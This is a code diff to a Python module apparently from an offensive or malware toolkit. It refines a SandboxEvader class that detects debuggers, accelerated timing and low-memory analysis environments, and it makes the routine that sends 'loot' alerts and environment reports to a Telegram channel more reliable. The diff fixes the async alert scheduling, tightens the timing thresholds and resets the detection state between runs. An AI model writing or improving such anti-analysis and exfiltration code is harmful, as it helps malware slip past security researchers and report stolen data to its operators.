@@ -25,6 +25,8 @@ COLORS = {
     "BOLD": "\033[1m",
 }
 
+_background_tasks: set[asyncio.Task] = set()
+
 
 def terminal(message):
     sys.stdout.write(str(message) + "\n")
@@ -33,7 +35,7 @@ def terminal(message):
 
 async def broadcast_tg_alert_async(loot_type, details):
     try:
-        await send_telegram_alert(loot_type, details)
+        await asyncio.wait_for(send_telegram_alert(loot_type, details), timeout=8)
     except Exception:
         pass
 
@@ -42,10 +44,10 @@ def broadcast_tg_alert_sync(loot_type, details):
     """Schedules non-blocking notifications when invoked from synchronous contexts."""
     try:
         loop = asyncio.get_running_loop()
-        if loop.is_running():
-            loop.create_task(broadcast_tg_alert_async(loot_type, details))
-        else:
-            asyncio.run(broadcast_tg_alert_async(loot_type, details))
+        if not loop.is_closed():
+            task = loop.create_task(broadcast_tg_alert_async(loot_type, details))
+            _background_tasks.add(task)
+            task.add_done_callback(_background_tasks.discard)
     except RuntimeError:
         try:
             asyncio.run(broadcast_tg_alert_async(loot_type, details))
@@ -58,7 +60,7 @@ class SandboxEvader:
 
     def __init__(self):
         self.evasion_triggered = False
-        self.indicators = []
+        self.indicators: list[str] = []
 
     def check_debugger(self):
         is_traced = sys.gettrace() is not None
@@ -80,9 +82,9 @@ class SandboxEvader:
     def check_timing_acceleration(self):
         try:
             start_time = time.perf_counter()
-            _ = sum(i * i for i in range(50_000))
+            _ = sum(i * i for i in range(500_000))
             elapsed = time.perf_counter() - start_time
-            if elapsed < 0.00005:
+            if elapsed < 0.00001:
                 self.indicators.append(f"Short timing delta observed ({elapsed:.6f}s)")
                 return True
         except Exception:
@@ -130,7 +132,7 @@ class SandboxEvader:
             if os.path.exists("/proc/meminfo"):
                 with open("/proc/meminfo", "r", encoding="utf-8", errors="ignore") as f:
                     for line in f:
-                        if "MemTotal" in line:
+                        if line.startswith("MemTotal:"):
                             parts = line.split()
                             if len(parts) >= 2 and parts[1].isdigit():
                                 kb_total = int(parts[1])
@@ -147,6 +149,7 @@ class SandboxEvader:
 
     def inspect_environment(self, persist_artifacts: bool = False):
         terminal(f"{COLORS['MAGENTA']}[*] Inspecting runtime environment diagnostics...{COLORS['RESET']}")
+        self.indicators = []
 
         apply_behavioral_jitter()
 
@@ -156,6 +159,7 @@ class SandboxEvader:
         res = self.check_resource_constraints()
 
         diagnostics_noted = dbg or tmg or cnt or res
+        self.evasion_triggered = diagnostics_noted
 
         report = {
             "analysis_environment_detected": diagnostics_noted,
@@ -168,12 +172,14 @@ class SandboxEvader:
         }
 
         if diagnostics_noted:
-            terminal(f"{COLORS['YELLOW']}[~] Runtime environment notes recorded ({len(self.indicators)} items).{COLORS['RESET']}")
+            terminal(
+                f"{COLORS['YELLOW']}[~] Runtime environment notes recorded ({len(self.indicators)} items).{COLORS['RESET']}"
+            )
             for ind in self.indicators:
                 terminal(f"  └── Note: {ind}")
 
             report_str = json.dumps(report, default=str)
-            report["integrity_hash"] = hashlib.sha256(report_str.encode("utf-8")).hexdigest()
+            report["integrity_hash"] = hashlib.sha256(report_str.encode("utf-8", errors="ignore")).hexdigest()
 
             if persist_artifacts:
                 broadcast_tg_alert_sync("Runtime Environment Diagnostics", report)
@@ -208,9 +214,9 @@ async def run_sandbox_evader(*args, **kwargs):
         }
 
 
-if __name__ == "__main__":
-    asyncio.run(run_sandbox_evader())
-
-
 async def evade_sandbox(*args, **kwargs):
     return await run_sandbox_evader(*args, **kwargs)
+
+
+if __name__ == "__main__":
+    asyncio.run(run_sandbox_evader())
